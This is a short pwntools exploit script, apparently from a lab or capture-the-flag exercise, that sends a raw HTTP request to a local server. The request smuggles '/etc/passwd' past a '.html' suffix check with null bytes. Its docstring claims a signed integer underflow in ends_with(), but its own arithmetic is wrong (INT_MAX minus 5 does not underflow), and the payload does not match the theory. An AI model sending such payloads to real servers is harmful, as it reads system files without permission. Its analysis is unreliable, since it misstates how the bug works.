from pwn import *



"""
Let me analyze why this is vulnerable:

1. The vulnerability is in `ends_with()` due to integer arithmetic:
```c
strncmp(text+text_length-suffix_length, suffix, suffix_length)
```

When `text_length` and `suffix_length` are large enough, `text_length-suffix_length` can underflow due to signed integer arithmetic.

Example:
```c
text_length = INT_MAX (2147483647)
suffix_length = 5 (.html)
text_length-suffix_length = -2147483644 (underflow!)
```

This causes `strncmp` to compare memory BEFORE the start of `text`, potentially accessing sensitive memory.

To exploit:
1. Make request with filename length close to INT_MAX
2. Add `.html` suffix
3. Server will read memory before the filename buffer
4. Could expose stack/heap contents or program memory

This is a classic integer underflow leading to out-of-bounds memory read vulnerability.
"""
payload = b"/etc/passwd\x00\x00.html" 
raw_request = b'GET /' + payload + b' HTTP/1.1\r\n'
raw_request += b'Host: localhost:8000\r\n'
raw_request += b'Connection: close\r\n'
raw_request += b'\r\n'
r = remote('localhost', 8081) 
r.send(raw_request)
response = r.recvline()
print(response)